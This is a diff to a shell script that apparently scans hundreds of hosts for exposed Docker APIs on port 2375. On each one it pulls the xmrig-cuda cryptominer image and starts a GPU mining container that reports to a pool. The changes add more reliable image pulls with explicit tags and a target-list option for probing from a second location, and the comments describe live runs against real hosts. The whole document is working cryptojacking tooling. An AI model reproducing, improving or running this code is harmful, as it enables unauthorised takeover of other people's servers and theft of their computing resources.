@@ -34,6 +34,7 @@ WORK="${HUNT_WORK:-$SELF_DIR/.hunt}"
 mkdir -p "$WORK" 2>/dev/null || :
 CLS="$WORK/dock.cls"
 IMG_CUDA="${CLS_IMAGE:-xmrig/xmrig-cuda}"
+IMG_TAG="${CLS_TAG:-latest}"
 PAR="${CLS_PAR:-24}"
 MAX_GPU="${CLS_GPU_MAX:-1200}"
 MAX_EXEC="${CLS_EXEC_MAX:-120}"
@@ -104,7 +105,18 @@ deploy_gpu() {
     ip=$1
     lst=$(curl -sS -m 5 "http://$ip:2375/containers/json?all=1" 2>/dev/null)
     if printf %s "$lst" | grep -q '"kwgpu"'; then echo "  $ip kwgpu present"; return; fi
-    curl -sS -m 300 -X POST "http://$ip:2375/images/create?fromImage=$IMG_CUDA" >/dev/null 2>&1
+    # Pull with an EXPLICIT tag, then PROVE the image is present before creating.
+    # Live: a silent pull failure surfaced three layers later as
+    # 'create failed: No such image: xmrig/xmrig-cuda:latest' on an otherwise
+    # healthy exec_ok host, and no deploy row was ever written for it.
+    curl -sS -m 420 -X POST "http://$ip:2375/images/create?fromImage=$IMG_CUDA&tag=$IMG_TAG" 2>/dev/null | tail -c 160 > "$WORK/cls.pull" 2>/dev/null || :
+    haveimg() { curl -sf -m 10 "http://$ip:2375/images/$IMG_CUDA:$IMG_TAG/json" >/dev/null 2>&1 || curl -sf -m 10 "http://$ip:2375/images/$IMG_CUDA/json" >/dev/null 2>&1; }
+    haveimg || curl -sS -m 420 -X POST "http://$ip:2375/images/create?fromImage=$IMG_CUDA&tag=$IMG_TAG" >/dev/null 2>&1
+    if ! haveimg; then
+        note "$ip" gpu_pullfail
+        echo "  $ip pull failed: $(head -c 90 "$WORK/cls.pull" 2>/dev/null)"
+        return
+    fi
     b="{\"Image\":\"$IMG_CUDA\",\"Tty\":true,\"Cmd\":[\"-o\",\"$POOLHOST\",\"-u\",\"$W\",\"-p\",\"$ip\",\"-k\",\"--tls\",\"--donate-level\",\"1\"],\"HostConfig\":{\"DeviceRequests\":[{\"Driver\":\"nvidia\",\"Count\":-1,\"Capabilities\":[[\"gpu\"]]}]}}"
     r=$(curl -sS -m 40 -X POST "http://$ip:2375/containers/create?name=kwgpu" -H 'Content-Type: application/json' -d "$b" 2>/dev/null)
     cid=$(printf %s "$r" | grep -oE '[0-9a-f]{64}' | head -1)
@@ -136,6 +148,12 @@ if [ "$MODE" = exec ] || [ "$MODE" = all ]; then
     awk -F'\t' '$2 ~ /^exec_/ || $2 ~ /^shell_only/ {print $1}' "$CLS" > "$WORK/cls.e2" 2>/dev/null
     sort -u "$WORK/cls.e2" > "$WORK/cls.e3"
     grep -vxF -f "$WORK/cls.e3" "$WORK/cls.e1" > "$WORK/cls.e4" 2>/dev/null || cp "$WORK/cls.e1" "$WORK/cls.e4"
+    # optional explicit target list: `dockcls.sh exec /path/list` - this is what
+    # lets a SECOND vantage point classify the same hosts. Reachability is source
+    # dependent (353 of ~400 hosts answer box1 with nothing), so re-running the
+    # identical probe from the PC is itself the experiment: a host that is no_api
+    # here and exec_ok there was never dead, it was blocked to box1.
+    if [ -n "${2:-}" ] && [ -s "${2:-}" ]; then cp "$2" "$WORK/cls.e4"; echo "  (target list $2)"; fi
     echo "  candidates=$(wc -l < "$WORK/cls.e4")"
     runlist "$WORK/cls.e4" probe_exec "$MAX_EXEC"
 fi
@@ -144,6 +162,7 @@ if [ "$MODE" = gpu ] || [ "$MODE" = all ]; then
     cut -f1 "$WORK/mass.found" 2>/dev/null | grep -E '^[0-9]' | sort -u > "$WORK/cls.g1"
     awk -F'\t' '$2=="gpu_ok" || $2=="gpu_no" || $2=="canned_page" {print $1}' "$CLS" 2>/dev/null | sort -u > "$WORK/cls.g2"
     grep -vxF -f "$WORK/cls.g2" "$WORK/cls.g1" > "$WORK/cls.g3" 2>/dev/null || cp "$WORK/cls.g1" "$WORK/cls.g3"
+    if [ -n "${2:-}" ] && [ -s "${2:-}" ]; then cp "$2" "$WORK/cls.g3"; echo "  (target list $2)"; fi
     echo "  known=$(wc -l < "$WORK/cls.g1") unclassified=$(wc -l < "$WORK/cls.g3")"
     runlist "$WORK/cls.g3" probe_gpu "$MAX_GPU"
 fi
